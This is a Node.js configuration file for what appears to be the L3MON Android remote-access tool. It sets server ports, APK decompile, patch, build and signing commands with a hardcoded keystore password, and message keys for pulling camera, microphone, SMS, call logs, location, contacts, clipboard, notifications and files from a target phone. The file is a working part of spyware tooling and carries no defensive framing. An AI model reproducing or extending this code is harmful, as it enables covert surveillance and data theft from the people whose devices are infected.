const path = require('path');

exports.debug = false;

exports.web_port = 22533;
exports.control_port = 22222;

// Paths
exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/L3MON.apk')
exports.baseApkPatched = path.join(__dirname, '../app/factory/base_patched.apk')

exports.downloadsFolder = '/client_downloads'
exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)

exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');

// Keystore for jarsigner signing (cross-platform)
exports.keystorePath = path.join(__dirname, '../app/factory/', 'l3mon.jks');
exports.keystorePass = 'l3mon123';
exports.keystoreAlias = 'testkey';

// Cross-platform detection
const os = require('os');
const isTermux = !!process.env.TERMUX_VERSION || (process.platform === 'linux' && os.homedir().includes('/data/data/com.termux'));
const isWindows = process.platform === 'win32';
const javaBin = 'java'; // proot not needed on modern Termux (Android 8+), causes SIGILL (exit 132)
const jarsignerBin = 'jarsigner';

exports.platform = { isTermux, isWindows };

// On Termux use native apktool (pkg install apktool) — bundled apktool.jar contains
// desktop ELF aapt binaries that crash on Android ARM (exit 2, "ELF: not found")
const apktoolCmd = isTermux
    ? 'apktool'
    : (javaBin + ' -jar "' + exports.apkTool + '"');

exports.buildCommand = apktoolCmd + ' b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
exports.signCommand = jarsignerBin + ' -keystore "' + exports.keystorePath + '" -storepass ' + exports.keystorePass + ' -keypass ' + exports.keystorePass + ' -signedjar "' + exports.apkSignedBuildPath + '" "' + exports.apkBuildPath + '" ' + exports.keystoreAlias;

exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP'
}

exports.logTypes = {
    error: {
        name: 'ERROR',
        color: 'red'
    },
    alert: {
        name: 'ALERT',
        color: 'amber'
    },
    success: {
        name: 'SUCCESS',
        color: 'limegreen'
    },
    info: {
        name: 'INFO',
        color: 'blue'
    }
}
